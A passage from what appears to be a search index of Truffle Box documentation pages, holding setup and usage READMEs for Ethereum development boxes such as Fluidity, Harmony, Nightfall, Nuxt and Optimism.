'Troubleshooting' link.\\n\\n\\n## Troubleshooting\\nSee our [Troubleshooting Errors](https://docs.aave.com/developers/tutorials/troubleshooting-errors) documentation.\\n\\n# Resources\\n - Our [flash loan documentation](https://docs.aave.com/developers/tutorials/performing-a-flash-loan)\\n - Our [Developer Discord channel](https://discord.gg/CJm5Jt3)\\n\"","title":"Index"},{"location":"boxes/fluidity-truffle-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS fluidity-truffle-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Fluidity Truffle Box\\n\\nA truffle box providing us with a more comprehensive setup for our truffle repositories.\\nIncluded:\\n- Circle CI set up\\n- Migration Utils\\n- [Solidity Coverage](http://github.com/leapdao/solidity-coverage#master)\\n- [Eth-gas-reporter](https://github.com/cgewecke/eth-gas-reporter)\\n- Solhint\\n- Standard ganache\\n- Ganache 'unlimited' (unlimited gas and contract size)\\n- Slither\\n- Mythril\\n\\n\\n## To unbox:\\n- Run `truffle unbox airswap/fluidity-truffle-box`\\n\\n## Circle CI:\\nA circle CI configuration file is provided already in the repository. This file is set up to perform:\\n- `yarn install`\\n- test migrations\\n- run all tests and calculate their coverage\\n- linting (this does not fix linting issues but reports them)\\n- eth-gas-reporter report on gas usage on contract deploys and tests\\n- clean up old branches in github\\n\\n## Migration Utils:\\nThis tool integrates with truffle migrations to enable a more comprehensive tracking of deployed contracts\\nand their addresses. Utilising `migration_utils.js` enables multiple deployed instances of the same contract\\nto be tracked easily, which truffle alone does not allow.\\n\\n## Solidity Coverage\\nWe use a [branch of solidity-coverage written by leapdao](http://github.com/leapdao/solidity-coverage#master),\\nwhich enables us to use the newer versions of solidity (0.5.0+).\\n\\nWe have found that solidity-coverage does not work with some versions of node. Our team use node v8.14.0 and\\nv8.16.0 at this current moment in time.\\n\\nTo run coverage locally, you must run the local coverage network using `yarn ganache-coverage`. In a new\\nterminal tab then run `yarn coverage` which will run all truffle tests and calculate coverage. To use\\ntruffle with this local blockchain, use `yarn truffle-coverage ___` filling in the command you want to use.\\n\\n## Solhint\\nSolhint is a solidity linter. `.solhint.json` contains our standard linting setup, which can be edited/updated.\\n`.solhintignore` marks any files that the linter should ignore e.g. any files that you havent written yourself.\\n`yarn lint` will execute solhint on all `.sol` files within the contracts folder.\\n\\n## Standard Ganache\\nGanache can be run on your terminal using the command `yarn ganache`. Using truffle with this can then occur\\nusing `yarn truffle ___` where you merely fill in the commands you would like to use.\\n\\n## Ganache 'Unlimited'\\nWe have set up what we call 'ganache unlimited' which allows unlimited block size and unlimited contract size\\non ganache. To start this version of ganace run `yarn ganache-unlimited` and interact with it using\\n`yarn truffle-unlimited ___`\\n\\n## Slither\\n\\nPrerequisites: for the following instructions to work, you must have:\\n- python3\\n\\nFrom within the root of the directory, run the following commands:\\n\\n```bash\\n~ pip3 install virtualenv // to install virtualenv\\n~ virtualenv venv-slither // to setup a virtual environment in folder ./venv-slither\\n~ source venv-slither/bin/activate // to activate your virtual environment\\n~ pip3 install -r slither-requirements.txt // to install the necessary requirements for slither\\n```\\n\\nYour local virtual environment is now setup ready to run slither. To run slither on the contracts, how run\\nthe following:\\n```bash\\nslither .\\n```\\n\\n## Mythril-Classic\\n\\nIf you do not have a Mac, [please see the wiki for ubuntu or docker setup instructions](https://github.com/ConsenSys/mythril-classic/wiki/Installation-and-Setup)\\nPrerequisites: for the following instructions to work, you must have:\\n- python3\\n- homebrew\\n- virtualenv (installed in section above)\\n\\nFrom within the root of the directory, run the following commands:\\n\\n```bash\\n~ brew update\\n~ brew upgrade\\n~ brew tap ethereum/ethereum\\n~ brew install leveldb\\n~ brew install solidity // now you have all the necessary dependencies from brew\\n\\n~ virtualenv venv-mythril // to setup a virtual environment in folder ./venv-mythril\\n~ source venv-mythril/bin/activate // to activate your virtual environment\\n~ pip3 install -r mythril-requirements.txt // to install the necessary requirements for mythril\\n```\\n\\n### Now to actually run mythril...\\n\\n'Mythril-Classic' depends on importing all of the relevant contract imports before analysing the code. Allowing\\nthese files to be imported actually has to be enabled,and gets more complex when allowing imports from\\nnode-modules (e.g. Open Zeppelin). For this reason it's easier to run mythril on a truffle build folder,\\nwhich does all the imports for you.\\nTo set this up we therefore run:\\n\\n```bash\\n~ rm -r build // To remove the existing build (in case theres any old files no longer used in there)\\n~ yarn truffle compile // To generate a fresh build with the latest versions\\n```\\n\\nNow all `myth` commands just need to be appended with `--truffle` to ensure they use the build folder.\\ne.g. the following command will run mythril on all contracts using the build folder:\\n```bash\\n~ myth -x --truffle\\n```\"","title":"Index"},{"location":"boxes/harmony-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS harmony-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# ![Harmony](box-img-sm.png)\\n\\n# Harmony Box\\n\\nHarmony Box is a Truffle box that will get you quickly up and running deploying smart contracts on Harmony using Truffle & native Ethereum tooling.\\n\\n## Getting started\\n\\n### Truffle\\n\\nIf you have Truffle installed globally:\\n\\n(Until the box has been approved by Truffle you have to rely on the git installation step below)\\n\\n```\\nmkdir harmony && cd harmony\\ntruffle unbox harmony\\n```\\n\\nOr if you want to install via git:\\n\\n```\\ngit clone https://github.com/harmony-one/harmony-box.git\\ncd harmony-box\\n```\\n\\n### .env\\n\\nCopy .env-example to .env:\\n\\n```\\ncp .env-example .env\\n```\\n\\nModify .env and replace \"`ENTER_PRIVATE_KEY_HERE`\" for each network with the respective private key you want to use when deploying contracts.\\n\\n### Dependencies\\n\\nInstall all required dependencies using yarn:\\n\\n```\\nyarn install\\n```\\n\\nThe dependencies installed are the following:\\n\\n- truffle: if you want to use a local installation rather than a global installation\\n- solc: Solidity compiler\\n- @trufflesuite/web3-provider-engine: framework for composing custom web3 providers\\n- ethereumjs-wallet: a lightweight Ethereum wallet implementation\\n- @openzeppelin/contracts: industry standard smart contract templates\\n- dotenv: .env file parsing library\\n\\n## Compilation\\n\\nGlobally installed Truffle:\\n```\\ntruffle compile\\n```\\n\\nLocally installed Truffle:\\n```\\nnode_modules/.bin/truffle compile\\n```\\n\\n## Migration\\n\\nThe Harmony Box comes pre-configured with three separate networks:\\n\\n- Localnet (http://localhost:9500)\\n- Testnet (https://api.s0.b.hmny.io)\\n- Mainnet (https://api.s0.t.hmny.io)\\n\\nTo deploy your contracts to these networks, you can run the following:\\n\\nGlobally installed Truffle:\\n```\\ntruffle migrate --reset --skip-dry-run --network localnet\\ntruffle migrate --reset --skip-dry-run --network testnet\\ntruffle migrate --reset --skip-dry-run --network mainnet\\n```\\n\\nLocally installed Truffle:\\n```\\nnode_modules/.bin/truffle migrate --reset --skip-dry-run --network localnet\\nnode_modules/.bin/truffle migrate --reset --skip-dry-run --network testnet\\nnode_modules/.bin/truffle migrate --reset --skip-dry-run --network mainnet\\n```\\n\\n## Testing\\n\\nGlobally installed Truffle:\\n```\\ntruffle test\\n```\\n\\nLocally installed Truffle:\\n```\\nnode_modules/.bin/truffle test\\n```\\n\\n## Attribution\\n\\n[private-provider.js](private-provider.js)\\xc2\\xa0was originally ported from [Moonbeam\\'s Truffle Box](https://github.com/PureStake/moonbeam-truffle-box/blob/db2f86516c1063b6bf56050e950b7ad67b500fe5/private-provider.js).\\n'","title":"Index"},{"location":"boxes/helloworldbox/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS HelloWorldBox CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# HelloWorldBox\\r\\n\\r\\n## Download Box\\r\\n```sh\\r\\ntruffle unbox yehia67/helloworldbox\\r\\n```\\r\\n\\r\\n## Installation\\r\\n\\r\\nInstall dependencies \\r\\n```sh\\r\\nnpm install\\r\\n```\\r\\nOS X & Linux:\\r\\n\\r\\n```sh\\r\\ntruffle develop\\r\\ncompile\\r\\nmigrate\\r\\n```\\r\\nOpen Another Terminal\\r\\n```sh\\r\\nnpm run dev\\r\\n```\\r\\nTo deploy on ropsten\\r\\n```sh\\r\\ndeploy --network ropsten-infura\\r\\n```\\r\\n## For More Details\\r\\ncheck this tutorial https://medium.com/@yehiatarek67/getting-started-with-dapp-developments-af7088422629\\r\\n'","title":"Index"},{"location":"boxes/koa-trufflebox/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS koa-trufflebox CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Koa-Box\\nA truffle box to serve as the foundation of any Truffle and Koa.js dApp.\\n\\nThis Box Uses NodeJS(Koa JS) to provide API endpoints to the Ethereum Blockchain smart contract so that this smart contract can be used in Android/Ios Apps as well.\\n\\n- Production grade lightweight JSON based logging utility\\n- configurable env's based on current NODE_ENV\\n- Error handling middlewares\\n- Easily pluggable controllers and routers\\n- The project structure is highly modular and can be directly used or extended for production purpose\\n\\n**Pre-Requisites**\\n1. [NodeJS](https://nodejs.org/en/)\\n2. [Yarn](https://yarnpkg.com/lang/en/docs/install/#mac-stable) Or [NPM](https://www.npmjs.com/get-npm)\\n3. [GanacheCLI](https://github.com/trufflesuite/ganache-cli)\\n4. [Truffle](https://github.com/trufflesuite/truffle)\\n\\n**Installation**\\n1. Install Truffle and Ganache CLI globally.\\n\\n```\\nnpm install -g truffle\\nnpm install -g ganache-cli\\n```\\n\\n2. Download the box. This also takes care of installing the necessary dependencies.\\n\\n```\\ntruffle unbox manjeet-thadani/koa-trufflebox\\n\\n```\\n\\n3. Install all the node modules required by running:\\n```javascript\\n// install all the node modules using npm\\nnpm install\\n``` \\nor if you prefer yarn\\n```javascript\\n//install all the node modules using yarn\\nyarn install\\n```\\n4. Start truffle development console using\\n```\\ntruffle develop\\n```\\n5. Inside the truffle console run `compile` to compile the contracts\\n6. You can see that a new `/build` folder has been created in the root directory which contains the compiled contracts.\\n\\n7. Now these contracts need to be deployed on the Blockchain. For this, run `migrate` inside the truffle development console\\n\\n\\n8. To run the Koa server `yarn start` or `npm start`\\n9. In the browser window open `http://localhost:8081/`.\\n\\n**Collaborators**\\n1. [MANJEET THADANI](https://github.com/manjeet-thadani)\\n2. [CHIRAG MALIWAL](https://github.com/cmaliwal)\\n\"","title":"Index"},{"location":"boxes/limelabs-angular-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS limelabs-angular-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"This is a fork from Quintor:\\n\\nI've added:\\n- SCSS instead of CSS\\n- Upgraded the typescript as I love async/await\\n- Added bootstrap 3\\n- Added Axios\\n\\nEverything below is the same as in Quintors Box\\n\\n# Truffle Box for Angular\\n\\nThis Truffle Box provides a base for working with the Truffle Framework and Angular.\\nIt provides a basic working example of the MetaCoin contracts with Angular components.\\nThis project is generated with [Angular CLI](https://cli.angular.io/).\\n\\n## Building\\n\\n1. Install truffle, Angular CLI and an Ethereum client. If you don't have a test environment, we recommend Ethereum TestRPC\\n ```bash\\n npm install -g truffle\\n npm install -g @angular/cli\\n npm install -g ethereumjs-testrpc\\n ```\\n\\n2. Download the box.\\n ```bash\\n truffle unbox LimelabsTech/angular-truffle-box\\n ```\\n\\n3. Run your Ethereum client. For TestRPC:\\n ```bash\\n testrpc\\n ```\\nNote the mnemonic 12-word phrase printed on startup, you will need it later.\\n\\n4. Compile and migrate your contracts.\\n ```bash\\n truffle compile && truffle migrate\\n ```\\n\\n## Running\\n\\n1. Run the app using Angular CLI:\\n ```bash\\n ng serve\\n ```\\nThe app is now served on localhost:4200\\n\\n2. Connect to it by opening it in your browser and configuring MetaMask with the 12-word phrase from TestRPC.\\n\\n3. Send MetaCoins!\\n\\n## Testing\\n\\n1. Running the Angular component tests:\\n ```bash\\n ng test\\n ```\\n\\n2. Running the Truffle tests:\\n ```bash\\n truffle test\\n ```\\n\\n3. Running Protactor end-to-end tests\\n\\n ```bash\\n ng e2e\\n ```\\n## Releasing\\nUsing the Angular CLI you can build a distributable of your app. Will be placed in `dist/`\\n\\n ```bash\\n ng build\\n ```\\n\\n## FAQ\\n\\n* __Where can I find more documentation?__\\n\\nThis Truffle box is a union of [Truffle](http://truffleframework.com/) and an Angular setup created with [Angular CLI](https://cli.angular.io/).\\nFor solidity compilation and Ethereum related issues, try the [Truffle documentation](http://truffleframework.com/docs/).\\nFor Angular CLI and typescript issues, refer to the [Angular CLI documentation](https://github.com/angular/angular-cli/wiki)\\n\"","title":"Index"},{"location":"boxes/macroverse-truffle-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS macroverse-truffle-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# Macroverse Truffle Box\\n\\nThis box comes with everything a developer needs to use [Macroverse](https://macroverse.io) in an Ethereum dapp or game.\\n\\n[![Matrix Chat: #macroverse:matrix.org](https://img.shields.io/badge/Matrix%20Chat-%23macroverse%3Amatrix.org-green.svg)](https://matrix.to/#/#macroverse:matrix.org)\\n\\n## What is Macroverse\\n\\nMacroverse is a procedurally generated universe, available to be used by blockchain-based games. Rather than paying expensive gas costs to store environment and level data on the blockchain, or spending large amounts of developer effort on custom world generation algorithms, game developers can use Macroverse as a piece of game development middleware, and can find settings for their games by exploring the single, shared Macroverse universe. Macroverse provides trusted, proven world generation algorithms, and a shared universe accessible to all developers, allowing even small developers to make big games.\\n\\nAccess to the Macroverse system is controlled by a token, [MRV](https://etherscan.io/token/0xAB6CF87a50F17d7F5E1FEaf81B6fE9FfBe8EBF84), which functions as a software license. An Ethereum account must hold a minimum balance, currently **100 MRV**, in order to query the Macroverse system on the live Ethereum network.\\n\\n### Macroverse Game Ideas\\n\\n* Develop an on-chain version of [Konquest](https://games.kde.org/game.php?game=konquest), played in a different galactic sector every time.\\n* Build a galaxy-spanning space trading game, with commodities in each station tradeable using smart contracts.\\n* Create a single-player 4X game, played in the browser. Take payments from players in Ether, with no app store needed.\\n* Use procedurally-generated terrain from Macroverse planets as the setting for an off-road racing simulator.\\n* Devise an orbital-mechanics-based strategy game, set around the moons of a gas giant. Make gameplay proceed in real time, and use blockchain technology to stop cheaters.\\n\\n### Macroverse Development Status\\n\\nCurrently, only the first major release of Macroverse, code-named **Cannon**, is deployed on the live Ethereum network. This release includes a galaxy of over 200 billion procedural stars, but does **not** currently implement planetary systems, orbital mechanics, or planetary terrain. Development of the next release, **Kepler**, can be tracked in the [Macroverse Github repository](https://github.com/NovakDistributed/macroverse). Bugs found in the Macroverse contracts should also be reported there.\\n\\n## Getting Started\\n\\nUse this box with:\\n\\n```\\ntruffle unbox NovakDistributed/macroverse-truffle-box\\n```\\n\\nThis will create a default Macroverse-enabled Truffle project, with the `macroverse` NPM module installed as a dependency, and with a Truffle migration script to enable testnet deployment of the Macroverse Generator and Macroverse Registry contracts.\\n\\n### Macroverse Star Generator Technical Background\\n\\nThe Macroverse Star Generator is a smart contract, deployed at address `0xc9650c155Bb268A1667B5F9c68701638cAE93d3f`, which is responsible for the procedural generation of the galaxy of stars that comprise the Macroverse universe. The galaxy is divided into sectors measuring 25 lightyears on a side. The universe as a whole extends 10,000 sectors in both directioons in X, Y, and Z from the origin, but most of the stars are concentrated in the galaxy, which consists of a disk with a radius of 6,800 sectors in the XZ plane, and a central spherical bulge with a radius of 1000 sectors.\\n\\nFrom the X, Y, and Z coordinates (in integers) of each sector, the number of objects (stars, black holes, or similar) in the sector is generated. From the sector coordinates and the object index, the object\\'s seed is generated. The seed of an object serves as its unique identifier for the virtual real estate system, and is also used to generate its properties.\\n\\nEach object in the Macroverse world is assigned an `ObjectClass` from the following list:\\n\\n* `Supergiant`\\n* `Giant`\\n* `MainSequence`\\n* `WhiteDwarf`\\n* `NeutronStar`\\n* `BlackHole`\\n\\nActual stars are assigned a `SpectralType` according to the [Harvard Spectral Classification](http://astronomy.swin.edu.au/cosmos/H/Harvard+Spectral+Classification) system.\\n\\nAdditionally, each object has an X, Y, Z position within its sector in light years, and a mass in solar masses. These are fractional values; since Solidity does not provide native support for non-integer types, these values are represented as fixed-point values (stored in a Solidity `int128`) with 40 fractional bits. The [RealMath Solidity library](https://github.com/NovakDistributed/macroverse/blob/master/contracts/RealMath.sol) is provided for working with these values in smart contracts, and the `macroverse` NPM module provides utility functions for converting to and from them in JavaScript code.\\n\\nFinally, each object has a flag indicating whether there are planets orbiting it. The actual planetary systems cannot yet be generated (they are coming in the [Kepler phase of Macroverse development](https://macroverse.io/#dev)), but the planetary system generation logic, when deployed, will respect this flag.\\n\\n### Querying the Macroverse Star Generator from JavaScript\\n\\n```\\n// Make sure you have the Macroverse JavaScript library\\nconst mv = require(\"macroverse\")\\n\\n// Get the Macroverse contract\\n// In Truffle testing code (assuming you have Truffle\\'s `artifacts` in scope), you would do:\\n// const MacroverseStarGenerator = artifacts.require(\"MacroverseStarGenerator\")\\n\\n// In real code, using truffle-contract\\nconst TruffleContract = require(\"truffle-contract\")\\nconst MacroverseStarGenerator = TruffleContract(require(\"macroverse/build/contracts/MacroverseStarGenerator.json\"))\\n\\n// You may need to point the contract at your web3 provider here\\n\\n// Either way, you need to get the deployed instance of the contract\\nconst generator = await MacroverseStarGenerator.deployed()\\n\\n// Then you can get the number of objects in a sector\\nlet objectCount = generator.getSectorObjectCount.call(0, 1, -1)\\n\\nfor (let i = 0; i < objectCount; i++) {\\n // Then you can loop over the objects and get the seed for each one\\n let seed = await generator.getSectorObjectSeed.call(0, 1, -1, i)\\n \\n // And then you can get properties of the object, like its class\\n let objectClass = await generator.getObjectClass.call(seed)\\n \\n // Use the Macroverse JS module to convert integers -> object class names\\n console.log(\"Object \" + i + \" is a \" + mv.objectClasses[objectClass])\\n}\\n```\\n\\nThe full Macroverse Star Generator API is documented inline in the [smart contract source](https://github.com/NovakDistributed/macroverse/blob/master/contracts/MacroverseStarGenerator.sol).\\n\\n\\n'","title":"Index"},{"location":"boxes/metacoin/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS metacoin-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# MetaCoin Truffle Box\\n\\nMetaCoin example Truffle project\\n'","title":"Index"},{"location":"boxes/moonbeam-truffle-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS moonbeam-truffle-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... niiice","title":"Index"},{"location":"boxes/nightfall/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS nightfall-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Nightfall Truffle Box\\n\\nThe easiest way to get started on [Nightfall](https://github.com/EYBlockchain/nightfall).\\n\\n## Supported hardware & prerequisites\\n\\nMac and Linux machines with at least 16GB of memory and 10GB of disk space are supported.\\n\\nNightfall requires the following software to run:\\n\\n- [Docker](https://docs.docker.com/v17.12/install/)\\n - Launch Docker Desktop (on Mac, it is on the menu bar) and set memory to 8GB with 4GB of swap\\n space (minimum - 12GB memory is better) or 16GB of memory with 512MB of swap. **The default\\n values for Docker Desktop will NOT work. No, they really won't**.\\n- [Node](https://nodejs.org/en/) (tested with 10.15.3) with npm and node-gyp\\n - If running macOS, install Xcode then run `xcode-select \\xe2\\x80\\x94install` to install command line tools.\\n - Note: Currently will not work with node v12. To check the node version, run `node --version`. If using mac/brew, then you may need to run `brew install node@10` and `brew link --overwrite node@10 --force`\\n- [Python](https://www.python.org/downloads/)\\n - Be sure npm is setup to use v2.7 of python, not python3. To check the python version, run `python --version`\\n - You may need to run `npm config set python /usr/bin/python2.7` (or wherever your python 2 location is)\\n\\n## Installation\\n\\nFirst ensure you are in a new and empty directory.\\n\\n1. Run the `unbox` command via `npx` and skip to step 3. This will install all necessary dependencies.\\n ```js\\n npx truffle unbox nightfall\\n ```\\n\\n2. Alternatively, you can install Truffle globally and run the `unbox` command.\\n ```javascript\\n npm install -g truffle\\n truffle unbox nightfall\\n ```\\n\\n3. Start Docker.\\n \\n4. In the root project directory, we generate the keys and constraint files for our [Zero Knowledge Proofs](https://blog.decentriq.ch/zk-snarks-primer-part-one/). This is about 7GB and depends on randomness for security. **This step can take a while, depending on your hardware (1-3 hours)**. Before you begin, check once more you have provisioned enough memory for Docker.\\n ```javascript\\n npm run setup\\n ```\\n\\n5. Alternatively, you can generate specific verification keys and constraint files one at time using a prompt.\\n ```javascript\\n npm run setup-prompt\\n ```\\n\\n6. Now, run the development console.\\n ```javascript\\n truffle develop\\n ```\\n\\n7. Compile and migrate the smart contracts. Note inside the development console we don't preface commands with `truffle`.\\n ```javascript\\n compile\\n migrate\\n ```\\n \\n8. Execute the script provided for registering Zero Knowledge Proof verification keys on-chain. Note inside the development console we don't preface commands with `truffle`.\\n ```javascript\\n exec scripts/registerVks.js\\n ```\\n \\n9. Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console.\\n ```javascript\\n // inside the development console.\\n test\\n\\n // outside the development console..\\n truffle test\\n ```\\n\\n## FAQ\\n\\n* __How do I use this with Ganache-CLI?__\\n\\n It's as easy as modifying the config file! [Check out our documentation on adding network configurations](http://truffleframework.com/docs/advanced/configuration#networks).\\n\\n* __Where can I find more documentation?__\\n\\n This box is a marriage of [Truffle](http://truffleframework.com/), [Nightfall](https://github.com/EYBlockchain/nightfall), and [ZoKrates](https://zokrates.github.io/). Any of them would be a great place to start!\\n\\n\\n# Acknowledgements\\nThis software uses [ZoKrates](https://hub.docker.com/r/michaelconnor/zok) which is [licensed](https://github.com/Zokrates/ZoKrates/blob/master/LICENSE) under [LGPL3](https://www.gnu.org/licenses/lgpl-3.0.en.html).\\n\"","title":"Index"},{"location":"boxes/nuxt-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS nuxt-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"![nuxt-box](https://storage.googleapis.com/paperchain-assets/nuxt-box-banner.png)\\n\\n# Nuxt-box\\nNuxt-box is a truffle box using the [Nuxt.js](https://nuxtjs.org) framework to create a [Vue.js](https://vuejs.org/) application that can interact with the smart contracts on [Ethereum](https://ethereum.org/).\\n\\n## Setup & Installation\\n- Install [truffle](http://truffleframework.com): `npm i -g truffle`\\n- Download the box. This also takes care of installing the necessary dependencies: `truffle unbox Paperchain/nuxt-box`\\n- Install [Metamask browser extension](https://metamask.io/)\\n\\n## Running the Application\\n\\n If you have MetaMask set for your browser, configure a \\n Custom RPC with address: http://localhost:9545 from Metamask Networks tab.\\n \\n1) Open terminal and run the development server: `truffle develop`\\n2) Connect local-rpc account with MetaMask. Follow [this answer](https://ethereum.stackexchange.com/questions/30593/how-can-i-import-the-accounts-from-truffle-develop-into-metamask) on Ethereum StackExchange.\\nThis account will have tokens and ether for transactions.\\n3) Deploy the contracts to the local-rpc: `migrate --reset`\\n4) Copy the token address from the terminal:\\n\\n```\\nEIP20: 0x345ca3e014aaf5dca488057592ee47305d9b3e10\\n```\\n\\n5) Paste the token address to **src/store/eip20.js** where it says:\\n\\n```\\nconst tokenAddress = '0x345ca3e014aaf5dca488057592ee47305d9b3e10'\\n// insert deployed EIP20 token address here\\n```\\n\\n6) Open a new terminal tab and run the webapp: `npm run dev`\\n\\n\\n## Web App Commands\\n\\n``` bash\\n# install dependencies\\n$ npm install # Or yarn install\\n\\n# serve with hot reload at localhost:3000\\n$ npm run dev\\n\\n# build for production and launch server\\n$ npm run build\\n$ npm start\\n\\n# generate static project using\\n$ npm run generate\\n\\n# lint or lintfix\\n$ npm run lint\\n$ npm run lintfix\\n```\\n\\n## Truffle Commands\\n\\n``` bash\\n# run contract tests\\n$ truffle test\\n\\n# run truffle development mode (run local blockchain)\\n$ truffle develop\\n\\n# deploy contracts to local blockchain\\n$ truffle migrate --reset\\n$ migrate --reset (when in development mode)\\n```\\n\\n\\n## Credits\\n\\nFor example purposes this boilerplate uses [EIP20 token contracts made by ConsenSys](https://github.com/ConsenSys/Tokens/tree/master/contracts/eip20).\\n\"","title":"Index"},{"location":"boxes/optimism/index.html","text":"Optimism Box \u00b6 Requirements Installation Setup Using the .env File New Configuration File New Directory Structure for Artifacts Optimistic Ethereum Compiling Migrating Basic Commands Testing Communication Between Ethereum and Optimism Chains Support Table of contents generated with markdown-toc This Truffle Optimism Box provides you with the boilerplate structure necessary to start coding for Optimism's Ethereum Layer 2 solution. For detailed information on how Optimism works, please see the documentation here . As a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Optimism without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Optimistic Solidity code against a variety of Optimism test networks. Optimism's Layer 2 solution is almost fully compatible with the EVM, though it uses an \"optimistic\" EVM called the OVM. The main difference between the EVM and the OVM that developers will notice is that some opcodes are not available for contracts that are deployed to the OVM. You can see the complete list of differences between Optimism's fork of the solc compiler and the original here . Requirements \u00b6 The Optimism Box has the following requirements: Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account Installation \u00b6 Note that this installation command will only work once the box is published (in the interim you can use truffle unbox https://github.com/truffle-box/optimism-box ). $ truffle unbox optimism Setup \u00b6 Using the env File \u00b6 You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.ovm.js file expects a GANACHE_MNEMONIC and a KOVAN_MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the optimistic network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\" INFURA_KEY=\"<Your Infura Project ID>\" GANACHE_MNEMONIC=\"<Your Ganache Mnemonic>\" KOVAN_MNEMONIC=\"<Your Kovan Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local optimistic ethereum network we will run in this Truffle Box. 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . New Configuration File \u00b6 A new configuration file exists in this project: truffle-config.ovm.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Optimism contracts and lists several networks for running the Optimism Layer 2 network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder. New Directory Structure for Artifacts \u00b6 When you compile or migrate, the resulting json files will be at build/optimism-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference! Optimistic Ethereum \u00b6 Compiling \u00b6 To compile your project using the Optimistic solc compiler, run the following in your terminal: npm run compile:ovm This script lets Truffle know to use the truffle-config.ovm.js configuration file, which references the Optimistic solc compiler. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between solc and optimistic solc ! Please note: the optimistic solc compiler we have included relies on the latest version of the package, and currently uses version 0.7.6 . If you would like to use a different version of solc , see the available optimistic versions here , and run: npm install @eth-optimism/solc@<YourVersion> ``` You can double check that you have the version you want by looking at the `package.json` dependencies in this project. If you would like to recompile previously compiled contracts, you can manually run this command with `truffle compile --config truffle-config.ovm.js` and add the `--all` flag. ### Migrating To migrate on an Optimistic Layer 2, run: npm run migrate:ovm --network=(ganache | optimistic_ethereum | optimistic_kovan) (remember to choose a network from these options!). You have several 